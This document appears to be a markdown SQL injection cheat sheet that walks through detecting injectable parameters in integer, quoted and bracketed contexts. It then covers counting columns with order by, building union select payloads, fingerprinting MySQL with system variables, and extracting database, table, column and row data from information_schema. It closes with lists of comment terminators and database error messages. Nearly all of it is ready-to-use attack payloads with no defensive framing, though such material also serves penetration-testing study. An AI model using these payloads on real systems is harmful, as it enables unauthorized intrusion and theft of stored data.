# SQL injection

## Detection and balancing

### Integer based

- ' 

	- error / no output

- "

	- error/no output

- or 1=1

	- any output / different output

- and 1=1

	- same output

- and false

	- no output

- and true

	- same output

- --+

	- same output

- and true--+

	- same output

### single quote enclosed

- '

	- error / no output

- "

	- no error 

- ' or '1'='1

	- any output/ different output

- ' and '1'='1

	- same output

- ' and false--+

	- no output

- ' and true--+

	- same output

### double quote enclosed

- '

	- no error/same output

- "

	- error/no output

- " or "1"="1

	- any output/ different output

- " and "1"="1

	- same output

- " and false--+

	- no output

- " and true--+

	- same output

### integer based bracket enclosed

- '

	- error/no output

- "

	- error/ no output

-  or 1=1

	- different output/ any output

-  and 1=1

	- different output/ any output

-  and false

	- No output

-  and true

	- Same Output

- --+

	- error/ no output

		- confirmation bracket is used

- )--+

	- Same Output

- ) and false--+

	- No output

- ) and true--+

	- Same output

### single quote bracket enclosed

- '

	- error/no output

- "

	- no error

- ' or '1'='1

	- different output/ any output

- ' and '1'='1

	- different output/ any output

- ' and false--+

	- error/no output

- ' and true--+

	- error/no output

- ') and False--+

	- error/no output

		- majorly no output

- ') and true--+

	- same output

- ') or true--+

	- different output/ any output

### double quote bracket enclosed

- '

	- no error / same output

- " 

	- error/ no output

- " or "1"="1

	- different output/ any output

- " and "1"="1

	- different output/ any output

- " and false--+

	- error/ no output

- " and true--+

	- error/ no output

- ") and False--+

	- error/ no output

		- majorly no output

- ") and true--+

	- no error / same output

- ") or true--+

	- different output/ any output

## Guessing Number of columns in the query

### order by <no of columns>

- start from bigger number 

	- if error or/no ouptut

		- reduce the column number

	- if no error

		- try increasing the column number

## Union based injection after confirming number of columns used in query

### union select 1,2,...<no of columns>

- if numbers get reflected on screen or in source code
- if numbers dont get reflected on screen or in source code

	- 23 and 0 union select 1,2,3,4,5--+
	- 23 and false union select 1,2,3,4,5--+
	- -23 union select 1,2,3,4,5--+
	- 23000000 union select 1,2,3,4,5--+
	- null union select 1,2,3,4,5--+
	- 23 && 0 union select 1,2,3,4,5--+

### union select 'a', 'b', 'c'.....

- try same as above query with respective values

### mysql_real_escape_string

- union select 0x68656c6c6f31,0x68656c6c6f32,0x68656c6c6f33,0x68656c6c6f34,0x68656c6c6f35--+

	- try hex values

### if any of the query works fingerprint the DB

- @@hostname	
- @@tmpdir	
- @@datadir	
- @@version	
- @@basedir	
- user()	
- database()	
- version()	
- schema()	
- UUID()	
- current_user()	
- current_user	
- system_user()	
- session_user()	
- @@GLOBAL.have_symlink	
- @@GLOBAL.have_ssl	

### Data Extraction

- To get available databases

	- union select table_schema from information_schema.schemata
	- programmer may not be printing all the rows.

		- union select table_schema from information_schema.schemata limit 0,1--+
		- union select table_schema from information_schema.schemata limit 1,1--+
		- union select table_schema from information_schema.schemata limit 2,1--+
		- union select table_schema from information_schema.schemata limit 3,1--+
		- and so on...

- to get all table names

	- Select table_name from information_schema.talbes where table_schema='databasename'

		- -23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+

	- programmer may not be printing all the rows

		- -23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1--+
		- -23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 1,1--+
		- -23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 2,1--+
		- -23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 3,1--+
		- and so on...
		- also try hex of column name

- to get all the column names

	- Select column_name from information_schema.columns where table_schema=database() and table_name='tablenamehere'

		- -23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere'--+

	- programmer may not be printing all the rows

		- -23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 0,1--+
		- -23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 1,1--+
		- -23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 2,1--+
		- -23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 3,1--+
		- and son on 
		- also try hex of tablename

- To get data from the column

	- Select column1, column2 from tablename

		- -23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1--+
		- -23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 1,1--+
		- -23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 2,1--+
		- -23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 3,1--+

## comments

### --

### --+

### #

### --+-

### ;%00

### `

### -- -

## errors

### mysql

- You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1

### mssql

- Server Error in '/' Application

### msaccess(php)

- Fatal error: Uncaught exception 'com_exception' with message Source: Microsoft JET Database Engine


### msaccess(IIS asp)

- Microsoft JET Database Engine error '80040e14'

### oracle

- ORA-00933: SQL command not properly ended

### odbc 

- Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)


### postgres

- PSQLException: ERROR: unterminated quoted string at or near "'" Position: 1orQuery failed: ERROR: syntax error at or near"'" at character 56 in /www/site/test.php on line 121.

### MS sql (server)

- Microsoft SQL Native Client error %u201880040e14%u2019Unclosed quotation mark after the character string

